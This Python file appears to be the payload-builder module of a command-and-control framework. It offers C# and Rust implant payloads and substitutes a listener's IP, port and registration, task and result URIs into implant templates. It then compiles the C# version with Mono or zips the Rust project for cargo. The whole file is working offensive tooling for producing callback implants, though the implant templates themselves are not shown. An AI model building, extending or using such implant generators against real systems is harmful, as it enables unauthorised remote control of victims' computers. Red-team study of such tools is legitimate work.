from shutil import copyfile

from common import *
from listenershelpers import listeners, isValidListener, checkListenersEmpty

import subprocess
import random
import string


Payloads = {
    "1" : "Coded in C#, compiled with Mono [mcs] -> exe",
    "2" : "Rust source code that you can compile with cargo on a win box -> rust_impl.zip"
}

vPayloads = [payload for payload in Payloads]
vArchs    = ["x64"]

def isValidPayload(name, s):

    if name in vPayloads:
        return True
    else:
        if s == 1:
            error("Invalid payload ID")
            return False
        else:
            return False

def isValidArch(arch, s):

    if arch in vArchs:
        return True
    else:
        if s == 1:
            error("Invalid architecture.")
            return False
        else:
            return False

def viewPayloads():

    success("Available payloads [x64 only]: ")

    print(YELLOW)
    print(" ID      		      Description")
    print("----     		      --------------------------------------------------------------------------")
    
    for i in Payloads:
        print(" {}".format(i) + " " * (29 - len(i)) + "{}".format(Payloads[i]))
    
    print(cRESET)

def build_pay(listener, idP):
    
    rnd_fname = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    
    ip        = listeners[listener].ipaddress
    port      = listeners[listener].port
    uReg      = listeners[listener].uri_reg
    uTasks    = listeners[listener].uri_tasks
    uResults  = listeners[listener].uri_results
    
    if idP == "1":
        
        temp_file = "./lib/templates/Implant.cs"
        outpath   = "./lib/templates/" + rnd_fname + ".cs"   
        prep_comp(temp_file, outpath, ip, port, uReg, uResults, uTasks)   
        out = subprocess.call(["mcs", outpath, "-r:System.Net.Http", "-sdk:4.8"])
        if out == 0:
            subprocess.call(["rm", outpath])
            success("File generated in: {}".format(outpath.replace('.cs','.exe')))

    elif idP == "2":
        temp_file = "./lib/templates/Implant.rs"
        outpath   = "./lib/templates/rust_impl/src/main.rs"
        prep_comp(temp_file, outpath, ip, port, uReg, uResults, uTasks)
        command = "cd ./lib/templates && zip -r rust_impl.zip rust_impl"
        out = subprocess.call(command, shell=True)

        if out == 0:
            success("Zip file generated: ./lib/templates/rust_impl.zip")
            success("To generate the exe payload unzip the file, then enter the folder rust_impl and execute: cargo b --release");

        
def prep_comp(temp_file, outpath, ip, port, uReg, uResults, uTasks):
    with open(temp_file, "rt") as p:
        payload = p.read()

        payload = payload.replace('§IP§',ip)
        payload = payload.replace('§PORT§',str(port))
        payload = payload.replace('§URIG§',uReg)
        payload = payload.replace('§URIS§',uResults)
        payload = payload.replace('§URIT§',uTasks)

        with open(outpath, "wt") as f:
            f.write(payload)


def generatePayload(args):
    
    if len(args) < 2:
        error("Invalid arguments. You must pass the listener and payload IDs, optional the compiler path")
        return 0
    else:
        #Type       = "exe[x64]"
        #arch       = "x64"
        listener = args[0]
        idP = args[1]
        
        #outputname = args[1]
        
        if isValidPayload(idP, 1) == False:
            return 0
        
        if checkListenersEmpty(1) == True:
            return 0

        if isValidListener(listener, 1) == False:
            return 0
        
        #if isValidArch(arch, 1) == False:
            #return 0
     
        build_pay(listener, idP)
        
